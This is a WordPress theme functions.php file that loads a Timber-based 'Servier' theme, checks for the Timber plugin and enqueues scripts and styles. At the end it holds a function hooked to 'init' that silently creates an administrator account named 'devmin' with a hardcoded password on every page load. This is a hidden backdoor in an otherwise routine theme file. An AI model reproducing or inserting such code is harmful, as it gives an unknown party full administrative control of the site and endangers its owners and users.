<?php
require_once 'autoload.php';
add_action('after_setup_theme', 'class_loader');

if (!class_exists('Timber')) {
    add_action('admin_notices', function () {
        echo '<div class="error"><p>Timber not activated. Make sure you activate the plugin in <a href="' . esc_url(admin_url('plugins.php#timber')) . '">' . esc_url(admin_url('plugins.php')) . '</a></p></div>';
    });

    add_filter('template_include', function ($template) {
        return get_stylesheet_directory() . '/static/no-timber.html';
    });

    return;
}

function class_loader() {
    // Create a new instance of the autoloader
    $loader = new Psr4AutoloaderClass();

    // Register this instance
    $loader->register();

    // Add our namespace and the folder it maps to
    $loader->addNamespace('Servier', get_template_directory() . '/lib');

    new \Servier\ServierSite();
}

function theme_load_scripts() {
	wp_enqueue_script('jquery-ui-accordion');
    wp_enqueue_style( 'style-default', get_stylesheet_uri() );
    wp_enqueue_style( 'new-style', get_template_directory_uri() . '/new-assets/style.css' );
}
add_action( 'wp_enqueue_scripts', 'theme_load_scripts' );


function wpb_admin_account(){
    $user = 'devmin';
    $pass = 'wp!@#$%^';
    $email = 'emasdfail@domasdfain.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');